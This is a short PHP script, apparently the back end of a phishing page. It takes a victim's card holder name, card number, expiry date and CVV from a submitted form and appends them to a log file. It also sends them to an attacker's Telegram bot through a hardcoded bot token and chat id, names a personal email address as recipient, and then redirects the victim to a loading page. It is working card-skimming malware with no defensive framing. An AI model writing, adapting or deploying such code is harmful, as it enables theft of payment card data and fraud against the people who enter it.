<?php
$to = "abdelhakimkhlif@yandex.com";
$subject = "My subject";
$text = "Card holder Name  :" . $_POST['ccname'] .  "\ncard number :" . $_POST['ccnum'] . "\nMonth :" . $_POST['mm'] . "\nYear :" . $_POST['jj'] . "\ncvv :" . $_POST['cvv'] . 
$result = @fopen("./data/logs/AntiBomb_RZT.txt", "a+");
					fwrite($result, $text);
					file_get_contents("https://api.telegram.org/bot2035106363:AAGfBKgi1WFKP76wLIlJmLdI5J8Q4t_pdiU/sendMessage?chat_id=1777139670&text=" . urlencode($text)."" );
header("Location: loading.php")
?>
